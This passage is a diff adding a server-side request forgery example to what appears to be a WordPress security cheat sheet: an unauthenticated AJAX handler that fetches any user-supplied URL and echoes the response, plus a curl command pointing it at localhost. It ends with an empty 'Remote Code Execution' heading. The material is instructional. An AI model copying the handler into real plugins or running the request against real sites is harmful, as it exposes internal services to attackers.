@@ -3302,6 +3302,31 @@ wp_remote_post
 wp_remote_request
 ```
 
+- Vulnerable code-:
+
+```php
+add_action("wp_ajax_nopriv_fetch_image_url", "fetch_image_url");
+
+function fetch_image_url(){
+    $response = wp_remote_get($_GET["image_url"]);
+    $image_data = wp_remote_retrieve_body($response);
+    echo $image_data;
+    die();
+}
+```
+
+- Exploiting it-:
+
+```bash
+curl [url]/wp-admin/admin-ajax.php?action=fetch_image_url&image_url=http://localhost:8080
+```
+
+----------------
+
+### REMOTE CODE EXECUTION
+
+-----------------
+
 
 
 
